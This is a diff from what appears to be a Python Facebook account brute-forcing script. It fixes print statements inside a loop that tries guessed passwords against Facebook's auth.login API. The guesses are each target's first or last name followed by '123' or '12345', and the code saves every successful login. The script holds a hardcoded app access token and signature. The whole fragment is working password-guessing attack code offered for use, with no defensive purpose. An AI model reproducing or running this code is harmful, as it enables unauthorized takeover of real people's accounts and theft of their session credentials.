@@ -407,7 +407,7 @@ def menumbf():
 			pas1=ya['first_name']+'123'
 			b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 			if 'access_token' in b:
-				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1' | '+p+name)
+				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1)
 				ok.append(user+pas1)
 			else:
 				if 'www.facebook.com' in b['error_msg']:
@@ -420,7 +420,7 @@ def menumbf():
 					pas2=ya['last_name']+'123'
 					b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 					if 'access_token' in b:
-						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2' | '+p+name)
+						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2)
 						ok.append(user+pas2)
 					else:
 						if 'www.facebook.com' in b['error_msg']:
@@ -433,7 +433,7 @@ def menumbf():
 							pas3=ya['first_name']+'12345'
 							b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 							if 'access_token' in b:
-								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3' | '+p+name)
+								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3)
 								ok.append(user+pas3)
 							else:
 								if 'www.facebook.com' in b['error_msg']:
